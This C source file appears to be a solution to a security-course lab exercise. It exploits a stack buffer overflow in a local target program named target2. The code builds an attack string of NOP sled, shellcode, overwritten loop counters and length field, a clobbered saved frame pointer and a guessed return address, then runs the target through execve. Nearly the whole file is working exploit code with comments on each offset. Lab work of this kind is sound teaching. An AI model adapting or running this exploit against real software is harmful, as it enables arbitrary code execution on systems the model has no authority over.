#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

// Represent the address 0x0000000040a4fd40
#define GUESSED_BUF_ADDR "\x40\xfd\xa4\x40\x00\x00\x00\x00"
// NOP of x86-64 ISA
#define NOP 0x90
// 252 bytes of buf (NOP + shellcode), 8 bytes of \x41 ('A'), 4 bytes of int p, 4 bytes of int j, 4 bytes of int len
#define ATTACK_STRING_SIZE 288
// buffer size defined in target2.c
#define BUF_SIZE 252

int main ( int argc, char * argv[] ) {

	int SHELLCODE_LENGTH = strlen(shellcode);
	char attack_str[ATTACK_STRING_SIZE];
	int NOP_SIZE = BUF_SIZE - SHELLCODE_LENGTH;
	int offset = 0;
	// rewriting 252 bytes of buf for NOP + shellcode
	memset(attack_str + offset, NOP, NOP_SIZE);
	// 207
	offset += NOP_SIZE;
	memcpy(attack_str + offset, shellcode, SHELLCODE_LENGTH);
	// 252
	offset += SHELLCODE_LENGTH;
	memset(attack_str + offset, '\x41', 8);
	// 260
	offset += 8;
	// rewriting int p for no purpose
	memset(attack_str + offset, '\x01', sizeof(int));
	// 264
	offset += sizeof(int);
	// now int j = 264 = 0x00000108, rewrite to 0x0000010c to make j = 267, then after this iteration j would +1 to become 268 = 0x0000011b
	memset(attack_str + offset, '\x0b', 1);
	// 265
	offset += 1;
	// since j becomes 268, rewriting the following 3 bytes for no purpose	
	memset(attack_str + offset, '\x41', 3);
	// 268
	offset += 3;
	// rewrite int len = 272 = 0x00000110 to len = 287 = 0x0000011f
	memset(attack_str + offset, '\x1f', 1);
	// 269
	offset += 1;
	memset(attack_str + offset, '\x01', 1);
	// 270
	offset += 1;
	memset(attack_str + offset, '\x00', 1);
	// 271
	offset += 1;
	memset(attack_str + offset, '\x00', 1);
	// 272
	offset += 1;
	// rewrite rbp
	memset(attack_str + offset, '\x41', sizeof(char *));
	// 280
	offset += sizeof(char *);
	// rewrite rip = RA
	memcpy(attack_str + offset, GUESSED_BUF_ADDR, sizeof(char *));
	
	char *	args[3];
	char *	env[6];

	args[0] = TARGET;
	args[1] = attack_str;
	args[2] = NULL;
	
	env[0] = &attack_str[271];
	env[1] = &attack_str[272];
	env[2] = &attack_str[285];
	env[3] = &attack_str[286];
	env[4] = &attack_str[287];
	env[5] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}

